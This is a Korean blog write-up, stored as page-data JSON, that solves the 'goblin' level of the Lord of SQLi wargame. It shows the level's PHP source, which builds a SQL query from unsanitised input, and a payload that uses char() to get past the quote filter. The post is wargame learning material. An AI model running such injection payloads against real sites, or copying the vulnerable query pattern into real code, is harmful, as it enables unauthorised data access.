{"pageProps":{"post":{"slug":"2017-08-10-LOS-goblin","content":"![](/assets/posts/los/goblin.png)\n\ncobolt 를 풀고 goblin으로 넘어오면 id 값은 guest로 고정이고 no 값만 입력받는 쿼리문이 있다.\n\n`query: select id from prob_goblin where id='guest' and no=`\n\n```php\n<?php \n\n  include \"./config.php\"; \n  login_chk(); \n  dbconnect(); \n  if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[no])) exit(\"No Hack ~_~\"); \n  if(preg_match('/\\'|\\\"|\\`/i', $_GET[no])) exit(\"No Quotes ~_~\"); \n  $query = \"select id from prob_goblin where id='guest' and no={$_GET[no]}\"; \n  echo \"<hr>query : <strong>{$query}</strong><hr><br>\"; \n  $result = @mysql_fetch_array(mysql_query($query)); \n  if($result['id']) echo \"<h2>Hello {$result[id]}</h2>\"; \n  if($result['id'] == 'admin') solve(\"goblin\");\n  highlight_file(__FILE__); \n?>\n```\n' , \" 등이 필터링 대상이기 때문에 쓸 수 없다.\n\n![](/assets/posts/los/goblin_guest.png)\n\nno 값이 1일때, Hello guest 가 뜬다.\n예상되는 구조는 다음과 같다.\n\n| no=1 | guest |\n|------|-------|\n| no=2 | admin |\n\nid가 guest로 고정이기 때문에 no=2 를 넘겨도 id는 admin이 되지 않는다.\n그렇다면 no값도 주고 id값도 admin으로 줄 수 있도록 하면 되지 않을까\n\n`?no=0%20or%20id=char(97,100,109,105,110)`\n\n이런식으로 직접적으로 admin을 넣어주지 않고 char 를 써주면 97 100 109 105 110이 admin이 된다.\n그리고 no에는 guest의 no 값인 1을 넣어주면 풀리지 않는다.\n\n![](/assets/posts/los/goblin_clear.png)\n\n고블린 클리어!\n\n\n","layout":"post","title":"[LOS] goblin","categories":["LOS"],"excerpt":" ","comments":true,"share":true,"tags":["LOS","Web-hacking","goblin","write-up"]}},"__N_SSG":true}